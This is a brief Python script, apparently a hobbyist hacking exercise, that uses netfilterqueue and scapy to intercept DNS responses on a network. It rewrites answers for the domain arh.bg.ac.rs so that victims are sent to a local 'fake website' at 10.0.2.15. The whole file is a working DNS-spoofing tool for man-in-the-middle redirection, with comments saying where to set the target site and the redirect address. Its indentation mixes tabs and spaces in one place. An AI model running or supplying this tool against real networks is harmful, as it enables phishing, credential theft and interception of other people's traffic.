#!/usr/bin/python
#this file takes the webpage of given website to our fake website
import netfilterqueue
#spoof the ip address and redirect them to our website
import scapy.all as scapy



def del_fields(scapy_packet):
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum

	del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum

	return scapy_packet
#deleting values like length and checksum from the packet headers of IP,DNS and UDP so it doesnot interfere




def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	#print(scapy_packet)
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if "arh.bg.ac.rs" in qname:
		#url of website to target specially http websites
			answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
			#ip on which you want to redirect to
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			scapy_packet = del_fields(scapy_packet)


			packet.set_payload(str(scapy_packet))
			#redirecting packet from arh.bg.ac.rs to our local ip or fake website
	packet.accept()
#this program checks if there is any dns for website and redirects to our fake dns



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
